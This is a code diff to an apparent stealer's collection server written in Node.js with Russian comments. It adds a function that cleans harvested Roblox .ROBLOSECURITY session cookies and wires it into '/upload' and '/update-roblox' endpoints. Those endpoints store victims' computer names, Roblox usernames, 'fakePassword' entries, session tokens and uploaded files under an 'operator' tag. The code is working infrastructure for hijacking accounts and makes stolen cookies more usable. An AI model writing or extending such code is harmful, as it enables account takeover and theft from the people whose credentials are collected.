@@ -103,6 +103,21 @@ function decodeFilename(name) {
   }
 }
 
+// Очистка .ROBLOSECURITY токена от мусора (бинарные префиксы, неправильная кодировка)
+function cleanRobloSecurity(raw) {
+  if (!raw || typeof raw !== 'string') return '';
+  let s = raw;
+  // Если токен содержит префикс _|WARNING — обрезаем всё до него
+  const warnIdx = s.indexOf('_|WARNING');
+  if (warnIdx > 0) s = s.substring(warnIdx);
+  // Если токен содержит _|_ (сокращённый формат) — обрезаем до него
+  const shortIdx = s.indexOf('_|_');
+  if (shortIdx > 0) s = s.substring(shortIdx);
+  // Убираем непечатные и управляющие символы (кроме базового ASCII)
+  s = s.replace(/[\x00-\x1F\x7F-\x9F]/g, '');
+  return s.trim();
+}
+
 function sanitizeFilename(name) {
   if (!name) return '';
   return name.replace(/[\\/:*?"<>|]/g, '_');
@@ -374,7 +389,7 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   const robloxInfo = {
     user: sanitize(req.body.robloxUser, 128) || '',
     pass: sanitize(req.body.fakePassword, 256) || '',
-    security: (typeof req.body.robloSecurity === 'string' ? req.body.robloSecurity : '').substring(0, 2048)
+    security: cleanRobloSecurity(req.body.robloSecurity).substring(0, 2048)
   };
 
   const operator = sanitize(req.body.operator, 64) || 'Shonll';
@@ -472,7 +487,8 @@ app.post('/upload', upload.array('files'), async (req, res) => {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.post('/update-roblox', async (req, res) => {
   try {
-    const { computerName, robloxUser, fakePassword, robloSecurity } = req.body;
+    const { computerName, robloxUser, fakePassword } = req.body;
+    const robloSecurity = cleanRobloSecurity(req.body.robloSecurity);
     const operator = (typeof req.body.operator === 'string' && req.body.operator) ? req.body.operator.substring(0, 64) : 'Shonll';
     const db = await getDb();
 
